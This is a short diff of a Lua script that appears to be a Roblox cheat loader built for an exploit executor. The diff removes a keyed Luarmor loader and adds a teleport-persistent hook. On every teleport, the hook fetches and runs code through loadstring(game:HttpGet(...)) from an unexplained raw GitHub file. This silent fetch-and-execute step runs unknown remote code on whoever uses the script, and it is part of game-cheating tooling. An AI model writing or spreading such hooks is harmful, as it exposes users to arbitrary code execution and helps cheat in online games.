@@ -5021,12 +5021,12 @@ local function main(...)
       return
     end
     getgenv().UE_LOADED = true
-    pcall(queue_on_teleport, ([[		if (not isfile("LOAD_PERSISTENT")) then
-			return;
-		end;
-		script_key, SILENT = "%s", isfile("LOAD_SILENTLY");
-		loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/b6956594687d0095f5afdd3e2a2056ad.lua"))();
-		]]):format(script_key or '?'))
+    pcall(queue_on_teleport, [[
+    if (not isfile("LOAD_PERSISTENT")) then
+        return;
+    end;
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/iloveshitpoop/Poopoppopo/refs/heads/main/Unnamed"))()
+]])
     if not game:IsLoaded() then
       game.Loaded:Wait()
     end
